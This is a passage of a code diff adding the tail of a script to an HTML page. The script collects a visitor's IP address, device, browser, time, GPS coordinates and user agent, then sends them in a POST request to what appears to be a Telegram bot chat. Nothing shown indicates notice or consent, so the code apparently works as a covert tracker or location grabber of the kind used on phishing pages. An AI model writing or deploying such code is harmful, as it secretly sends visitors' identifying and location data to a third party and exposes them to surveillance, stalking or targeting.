+                    `📡 IP: ${ip}\n` +
+                    `🖥 Device: ${deviceType}\n` +
+                    `🧰 Browser: 🌐 ${systemInfo.browser}\n` +
+                    `📅 Time: ${time} \n` +
+                    `🔗 Coordinates: ${latitude},${longitude}\n` +
+                    `🧾 UA: ${systemInfo.userAgent}\n` +
+                    `━━━━━━━━━━━━━━━━━━━━`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(error => console.error('Telegram log failed:', error));
+        }
+    </script>
+</body>
+
+</html>
